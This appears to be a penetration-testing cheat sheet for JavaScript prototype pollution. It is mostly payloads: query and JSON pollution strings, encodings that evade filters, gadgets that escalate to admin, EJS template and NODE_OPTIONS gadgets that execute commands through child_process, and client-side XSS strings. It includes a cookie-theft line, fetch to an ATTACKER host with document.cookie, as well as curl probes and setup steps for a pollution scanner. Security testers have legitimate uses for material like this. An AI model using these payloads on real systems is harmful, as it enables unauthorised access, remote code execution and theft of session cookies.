# Prototype Pollution

## Try

```text
?__proto__[polluted]=1
?constructor[prototype][polluted]=1
?prototype[polluted]=1
?__proto__.polluted=1
?constructor.prototype.polluted=1
```

```json
{"__proto__":{"polluted":"1"}}
{"constructor":{"prototype":{"polluted":"1"}}}
{"prototype":{"polluted":"1"}}
{"a":{"__proto__":{"polluted":"1"}}}
{"a":[{"__proto__":{"polluted":"1"}}]}
```

Check if it sticks:

```text
polluted
[object Object]
true
admin
```

Server-side JS check:

```js
({}).polluted
Object.prototype.polluted
```

## Sources

Common parsers / merge points:

```text
qs / express extended query parser
lodash merge / defaultsDeep / set
jquery extend(true, ...)
hoek merge
deepmerge
merge-recursive
dot-prop / object-path
set-value / unset-value
flat / unflatten
minimist / yargs-parser / optimist
fast-json-patch / json8-patch
YAML or JSON config merge
GraphQL variables merged into defaults
Mongo-style update paths merged into objects
```

Payload encodings:

```text
__proto__[x]=1
constructor[prototype][x]=1
__proto__.x=1
constructor.prototype.x=1
%5f%5fproto%5f%5f[x]=1
__pr%6fto__[x]=1
%63onstructor[prototype][x]=1
constructor%5bprototype%5d%5bx%5d=1
constructor%2eprototype%2ex=1
__proto__%252ex=1
```

## JSON Patch / Path Sources

Try these when the API accepts JSON Patch, object paths, settings paths, or profile update paths.

```json
[{"op":"add","path":"/__proto__/polluted","value":"1"}]
[{"op":"replace","path":"/constructor/prototype/polluted","value":"1"}]
[{"op":"add","path":"/a/b/../../../__proto__/polluted","value":"1"}]
```

Dot-path variants:

```json
{"path":"__proto__.polluted","value":"1"}
{"path":"constructor.prototype.polluted","value":"1"}
{"key":"__proto__.isAdmin","value":true}
{"name":"constructor.prototype.debug","value":true}
```

If `/__proto__/x` is blocked, try `constructor/prototype/x`. If both are blocked only at the first segment, bury the path inside a nested object and look for recursive merge.

## URL Param Gadgets

```text
?name=a&__proto__[debug]=true
?name=a&__proto__[debug_url]=https://ATTACKER/x.js
?name=a&constructor[prototype][debug]=true
?__proto__[isAdmin]=true
?__proto__[role]=admin
?__proto__[authenticated]=true
?__proto__[user][role]=admin
?__proto__[allowDots]=true
?__proto__[body][type]=Program
?__proto__[json%20spaces]=2
?__proto__[status]=418
?__proto__[exposed]=true
```

## Template Gadgets

```json
{"__proto__":{"client":true}}
{"__proto__":{"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
{"__proto__":{"localsName":"it;return process.mainModule.require('child_process').execSync('id');//"}}
```

EJS / Express query-style:

```text
settings[view options][client]=true
settings[view options][escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x
__proto__[client]=true
__proto__[escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x
__proto__[localsName]=it;return process.mainModule.require('child_process').execSync('id');//
```

Pug / Handlebars config names to inspect when polluted config reaches templates:

```text
compileDebug
self
filename
basedir
helpers
partials
doctype
pretty
```

Handlebars/Express helper abuse depends on the app wiring, but these keys are worth testing when options are inherited:

```json
{"__proto__":{"allowProtoPropertiesByDefault":true}}
{"__proto__":{"allowProtoMethodsByDefault":true}}
```

## Access-Control Gadgets

Try keys that match app authorization logic:

```json
{"__proto__":{"admin":true}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"roles":["admin"]}}
{"__proto__":{"authenticated":true}}
{"__proto__":{"canDelete":true}}
{"__proto__":{"owner":true}}
{"__proto__":{"permissions":["*"]}}
{"__proto__":{"scope":"admin"}}
{"__proto__":{"plan":"enterprise"}}
{"__proto__":{"verified":true}}
```

Debug/config gadgets:

```json
{"__proto__":{"debug":true}}
{"__proto__":{"verbose":true}}
{"__proto__":{"env":"development"}}
{"__proto__":{"NODE_ENV":"development"}}
{"__proto__":{"json spaces":2}}
{"__proto__":{"view cache":false}}
{"__proto__":{"cache":false}}
{"__proto__":{"strict":false}}
```

## Express / qs Checks

```bash
curl 'http://HOST/?__proto__[x]=1'
curl 'http://HOST/?constructor[prototype][x]=1'
curl 'http://HOST/?__proto__.x=1'
curl -X POST http://HOST/ -H 'Content-Type: application/json' -d '{"__proto__":{"x":"1"}}'
curl -X POST http://HOST/ -H 'Content-Type: application/x-www-form-urlencoded' -d '__proto__[x]=1'
curl -X POST http://HOST/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'constructor[prototype][x]=1'
```

Harmless black-box probes:

```bash
# Express JSON pretty-print side effect if app uses inherited app/settings options.
curl 'http://HOST/?__proto__[json%20spaces]=8'

# Error shape changes when a polluted status/exposed/message is inherited by an error object.
curl 'http://HOST/?__proto__[status]=418&__proto__[exposed]=true'

# Trigger a later endpoint that renders templates or creates errors after sending pollution.
curl http://HOST/render
curl http://HOST/error
```

Use a two-request flow. Pollution often happens on one endpoint and the visible sink is a different endpoint.

## Client Side

```html
<script src="https://ATTACKER/x.js"></script>
```

```js
fetch('https://ATTACKER/?c=' + encodeURIComponent(document.cookie))
```

Client-side pollution keys to try:

```text
?__proto__[src]=https://ATTACKER/x.js
?__proto__[url]=https://ATTACKER/x.js
?__proto__[scriptUrl]=https://ATTACKER/x.js
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[html]=<img src=x onerror=alert(1)>
?__proto__[sanitize]=false
?__proto__[isAdmin]=true
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[href]=javascript:alert(1)
?__proto__[template]=<img src=x onerror=alert(1)>
?__proto__[allowHTML]=true
?__proto__[ALLOWED_TAGS][]=script
?__proto__[ALLOWED_ATTR][]=onerror
```

Common sinks:

```js
element.innerHTML = config.html
script.src = config.src
fetch(config.url)
if (user.isAdmin) showAdmin()
Object.assign(defaults, userInput)
iframe.srcdoc = config.srcdoc
location.href = config.redirect
DOMPurify.sanitize(html, config)
```

Browser testing:

```js
// After loading a polluted URL, test in DevTools.
({}).polluted
Object.prototype.src
Object.prototype.html
```

DOM Invader in Burp is useful for client-side source/sink discovery. For manual work, set a breakpoint before app JS runs, load the polluted URL, then inspect `Object.prototype` and config objects.

## Pollution To Command Execution

For more JavaScript ways to reach `execSync`, see [Node.js](nodejs.md).

If pollution reaches `child_process` options:

```json
{"__proto__":{"shell":"/bin/sh"}}
{"__proto__":{"argv0":"sh"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/pwn.js"}}}
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}
{"__proto__":{"stdio":"inherit"}}
```

If app later writes a controlled JS file and spawns `node`, polluted `NODE_OPTIONS=--require /path/file.js` can execute it.

`NODE_OPTIONS` without a file write:

```json
{
  "__proto__": {
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ",
      "EVIL": "require('child_process').execSync('id'); //"
    }
  }
}
```

This needs a later `node` child process that inherits a polluted `env` object. Use file-write `--require /tmp/pwn.js` when you can control a JS file; use `/proc/self/environ` when you can only control environment strings on Linux.

## Denylist Bypasses

```text
constructor.prototype.x=1
constructor[prototype][x]=1
__pro__proto__to__[x]=1
__proto__%2ex=1
__proto__%252ex=1
__proto__[][x]=1
%5f%5fproto%5f%5f[x]=1
```

If the filter strips the literal string once, try split/encoded forms. If it blocks `__proto__` only, use `constructor.prototype`. If it blocks path sources, switch to recursive JSON merge.

## Tools

```text
DOM Invader: Burp Suite browser tool for client-side prototype pollution.
ppmap: https://github.com/kleiton0x00/ppmap
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
```

```bash
git clone https://github.com/kleiton0x00/ppmap
cd ppmap
bash setup.sh
echo 'http://HOST/?q=1' | ppmap
cat urls.txt | ppmap
```

## Cleanup / Verification

Pollution can persist in a running Node process. Re-test with a fresh process if results become confusing.

```text
1. Send pollution.
2. Hit a separate endpoint that uses defaults/config.
3. Check if a clean request now behaves differently.
4. Restart service to clear Object.prototype pollution.
```
